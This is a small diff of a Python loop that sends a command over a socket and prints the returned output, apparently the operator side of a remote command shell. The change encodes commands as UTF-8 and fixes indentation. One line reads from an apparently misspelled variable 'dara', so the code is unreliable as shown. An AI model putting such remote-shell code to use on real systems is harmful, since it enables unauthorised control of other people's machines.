@@ -21,10 +21,8 @@ while True:
         data.close()
         s.close()
         exit()
-      data.send(cmd)
+      data.send(cmd.encode("utf-8"))
       output = dara.recv(4096).decode("utf-8")
       print(output)
-     except:
-       pass
-      
-      
+    except:
+      pass
